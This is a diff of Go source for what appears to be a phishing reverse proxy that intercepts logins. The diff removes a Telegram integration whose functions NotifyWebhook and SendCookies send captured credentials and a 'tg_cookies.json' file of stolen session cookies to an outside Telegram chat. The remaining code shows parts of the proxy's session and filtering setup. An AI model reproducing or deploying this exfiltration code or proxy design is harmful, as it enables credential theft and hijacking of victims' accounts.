@@ -34,8 +34,6 @@ import (
 
 	"golang.org/x/net/proxy"
 
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
-
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
@@ -84,8 +82,6 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
-	telegram_bot      *tgbotapi.BotAPI
-	telegram_chat_id  int64
 }
 
 type ProxySession struct {
@@ -98,27 +94,6 @@ type ProxySession struct {
 
 type data struct {
 	Fai string `json:"as"`
-}
-
-func (p *HttpProxy) NotifyWebhook(msg string) {
-	if p.telegram_bot != nil {
-		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
-		if _, err := p.telegram_bot.Send(creds); err != nil {
-			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
-		}
-	}
-}
-
-func (p *HttpProxy) SendCookies(msg string) {
-	if p.telegram_bot != nil {
-		cookies := tgbotapi.NewDocument(p.telegram_chat_id, tgbotapi.FileBytes{
-			Name:  "tg_cookies.json",
-			Bytes: []byte(msg),
-		})
-		if _, err := p.telegram_bot.Send(cookies); err != nil {
-			log.Error("failed to send telegram cookie webhook in one file. msg length %v: err: %s", len(msg), err)
-		}
-	}
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -135,7 +110,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		telegram_bot:      nil,
 	}
 
 	p.Server = &http.Server{
